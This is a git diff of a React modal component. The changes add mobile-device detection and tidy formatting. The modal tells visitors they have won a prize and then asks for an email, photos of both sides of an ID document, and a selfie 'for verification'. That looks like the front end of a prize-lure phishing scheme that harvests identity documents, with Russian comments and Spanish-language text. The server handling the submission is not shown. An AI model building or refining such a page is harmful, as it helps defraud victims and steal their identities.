@@ -1,16 +1,32 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { FaRegAddressCard } from "react-icons/fa6";
 import { FaRegCreditCard } from "react-icons/fa6";
 import { FaRegCircleUser } from "react-icons/fa6";
 import axios from 'axios';
 
-const Modal = ({result, front, back, selfie, setFront, setBack, setSelfie, setPassScaner}) => {
+const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setPassScaner }) => {
 
 
     const [email, setEmail] = useState();
     const [emailError, setEmailError] = useState(false);
 
     const [finish, setFinish] = useState(false)
+
+
+    const [isMobile, setIsMobile] = useState(false);
+
+    useEffect(() => {
+        // Проверяем, является ли текущее устройство мобильным
+        const isMobileDevice = () => {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        };
+
+        // Устанавливаем значение isMobile
+        setIsMobile(isMobileDevice());
+    }, []);
+
+    // Стиль модального окна
+    const modalStyle = result ? { transform: isMobile ? 'scale(1)' : 'translate(-50%, -50%) scale(1)' } : {};
 
     const handleSubmit = async () => {
         if (!email || !front || !back || !selfie) {
@@ -52,7 +68,7 @@ const Modal = ({result, front, back, selfie, setFront, setBack, setSelfie, setPa
 
 
     return (
-        <div className="modal" style={result ? { transform: 'translate(-50%, -50%) scale(1)' } : {}}>
+        <div className="modal" style={modalStyle}>
             <h2>¡Felicidades! Tu premio es <span>{result}</span></h2>
             {finish ? (
                 <p>Genial, tus documentos han sido enviados para verificación, espera.</p>
@@ -72,7 +88,7 @@ const Modal = ({result, front, back, selfie, setFront, setBack, setSelfie, setPa
                         <div className="front">
                             <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'front')} />
                             {front ? (
-                                <img src={front} alt='' onClick={() => setPassScaner('front')}/>
+                                <img src={front} alt='' onClick={() => setPassScaner('front')} />
                             ) : (
                                 <FaRegAddressCard onClick={() => setPassScaner('front')} />
                             )}
@@ -81,7 +97,7 @@ const Modal = ({result, front, back, selfie, setFront, setBack, setSelfie, setPa
                         <div className="back">
                             <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'back')} />
                             {back ? (
-                                <img src={back} alt='' onClick={() => setPassScaner('back')}/>
+                                <img src={back} alt='' onClick={() => setPassScaner('back')} />
                             ) : (
                                 <FaRegCreditCard onClick={() => setPassScaner('back')} />
                             )}
